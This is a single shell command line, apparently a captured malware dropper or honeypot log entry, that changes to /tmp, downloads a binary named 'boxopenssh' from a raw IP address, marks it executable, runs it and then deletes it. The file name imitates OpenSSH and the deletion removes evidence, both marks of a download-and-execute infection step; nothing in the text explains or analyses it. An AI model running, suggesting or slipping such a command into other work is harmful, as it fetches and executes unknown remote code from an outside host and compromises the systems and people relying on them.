cd /tmp; wget http://212.237.13.92/boxopenssh; chmod +x boxopenssh; ./boxopenssh; rm -rf boxopenssh
